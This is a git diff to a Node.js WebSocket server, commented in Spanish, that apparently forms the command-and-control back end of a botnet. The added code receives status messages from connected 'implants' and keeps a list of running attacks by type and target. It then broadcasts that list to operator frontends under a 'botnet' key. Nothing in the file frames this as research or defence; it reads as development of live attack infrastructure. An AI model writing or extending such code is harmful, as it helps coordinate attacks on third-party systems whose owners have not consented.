@@ -14,11 +14,14 @@ import jwt from 'jsonwebtoken';
 
 
 
+
+
 const webSocketsServer = async (httpServer) => {
   try {
     const server = new WebSocketServer({ server: httpServer });
     const agents = new Map();   // Mapa de agents conectados (por ID)
     const users = new Set();  // Set de users conectados (frontends)
+    let attacks = [];
 
     server.on('connection', (socket, request) => {
       const url = new URL(request.url, `http://${request.headers.host}`);
@@ -46,6 +49,8 @@ const webSocketsServer = async (httpServer) => {
         return;
       }
 
+
+
       // Si es agente
       if (!clientId) {
         console.log("Cliente sin ID, cerrando");
@@ -58,9 +63,37 @@ const webSocketsServer = async (httpServer) => {
         agents.get(clientId).terminate();
       }
 
+
       console.log(`Agente conectado con ID: ${clientId}`);
       agents.set(clientId, socket);
       socket.isAlive = true;
+
+      //Datos proveniente de implantes
+      socket.on('message', (data) => {
+          const data_parsed = JSON.parse(data);
+          
+          if(!data_parsed.error) {
+              console.log(data_parsed);
+
+              if(data_parsed.status === 'attack_completed') {
+                  // Filtrar para REMOVER el ataque completado
+                  attacks = attacks.filter(a => 
+                      a.attack_type !== data_parsed.attack_type || 
+                      a.target !== data_parsed.target
+                  );
+              } else if(data_parsed.status === 'attack_started') {
+                  // Solo agregar si es un nuevo ataque
+                  const exists = attacks.some(a => 
+                      a.attack_type === data_parsed.attack_type && 
+                      a.target === data_parsed.target
+                  );
+                  
+                  if(!exists) {
+                      attacks.push(data_parsed);
+                  }
+              }
+          }
+      });
 
       socket.on('pong', () => socket.isAlive = true);
 
@@ -94,19 +127,21 @@ const webSocketsServer = async (httpServer) => {
 
       // Enviar estados a todos los users conectados
       const payload = {
-        data: status_connections
+        data: status_connections,
+        botnet: attacks
       };
 
       
     // Reenviar a todos los users
     users.forEach(userSocket => {
       if (userSocket.readyState === userSocket.OPEN) {
-        userSocket.send(JSON.stringify(status_connections));
+        userSocket.send(JSON.stringify(payload));
       }
     });
     }, 2000);
 
     server.on("close", () => clearInterval(interval));
+
 
     return { agents, users };
 
@@ -139,7 +174,7 @@ const main = async () =>{
     app.use(type_errors);
     app.use(syntax_errors);
     
-    server.listen(process.env.PORT, '0.0.0.0', ()=> console.log(`Esuchando en el puerto ${process.env.PORT}`))
+    server.listen(process.env.PORT, 'localhost', ()=> console.log(`Esuchando en el puerto ${process.env.PORT}`))
 
 }
 main()
